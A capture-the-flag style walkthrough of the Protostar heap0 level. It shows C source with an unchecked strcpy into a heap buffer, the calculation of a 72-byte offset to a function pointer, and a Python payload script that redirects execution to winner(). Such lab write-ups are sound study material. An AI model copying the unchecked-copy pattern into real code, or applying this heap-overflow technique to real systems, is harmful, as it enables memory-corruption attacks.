source code
```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();
}
```

`argv[1]` is copied to `d->name` without boundary check, so we can use it to overflow `f->fp`.

Addresses of `data` and `fp` are printed to stdout and are fixed.
```shell
Every 1.0s: ./heap0 1111                                                                       Wed Jul 26 00:14:35 2023

data is at 0x804a008, fp is at 0x804a050
level has not been passed
```


`0x50` - `0x08` is 72. 72 bytes to fill and 1 byte to overwrite `fp` to point to `winner`.

Find address of `winner`,
```
user@protostar:~$ objdump -d heap0 | grep winner
08048464 <winner>:
08048478 <nowinner>:
```

overflow diagram,
```

0x804a050 [0x8048464] fp
          ↑
           A...
           AAAA
           AAAA 
0x804a008 [AAAA] data
          ↑
```

`sc.py`
```python
from __future__ import print_function
from struct import pack

offset = 72
payload = b'A' * offset
payload += pack('<I', 0x8048464)

print(payload, end='')
```

```shell
user@protostar:~$ ./heap0 $(python sc.py)
data is at 0x804a008, fp is at 0x804a050
level passed
```